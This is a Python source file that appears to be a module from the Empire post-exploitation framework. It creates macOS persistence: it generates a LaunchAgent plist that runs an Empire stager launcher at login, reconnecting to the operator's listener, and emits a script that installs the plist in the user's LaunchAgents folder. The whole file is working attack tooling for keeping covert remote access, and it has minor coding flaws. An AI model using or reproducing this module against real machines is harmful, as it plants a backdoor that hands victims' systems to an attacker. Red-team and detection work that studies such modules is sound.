from builtins import object
from typing import Dict, Tuple, Optional

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = "") -> Tuple[Optional[str], Optional[str]]:

        plist_name = params['PLISTName']
        programname = "~/Library/LaunchAgents"
        plistfilename = "%s.plist" % plist_name
        listener_name = params['Listener']
        user_agent = params['UserAgent']
        safe_checks = params['SafeChecks']
        launcher = main_menu.stagers.generate_launcher(listener_name, language='python', userAgent=user_agent, safeChecks=safe_checks)
        launcher = launcher.strip('echo').strip(' | python3 &').strip("\"")

        plistSettings = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>%s</string>
<key>ProgramArguments</key>
<array>
<string>python</string>
<string>-c</string>
<string>%s</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
""" % (plist_name, launcher)

        script = """
import subprocess
import sys
import base64
import os


plistPath = "/Library/LaunchAgents/%s"

if not os.path.exists(os.path.split(plistPath)[0]):
    os.makedirs(os.path.split(plistPath)[0])

plist = \"\"\"
%s
\"\"\"

homedir = os.getenv("HOME")

plistPath = homedir + plistPath

e = open(plistPath,'wb')
e.write(plist)
e.close()

os.chmod(plistPath, 0644)


print("\\n[+] Persistence has been installed: /Library/LaunchAgents/%s")

""" % (plist_name, plistSettings, plist_name)

        return script
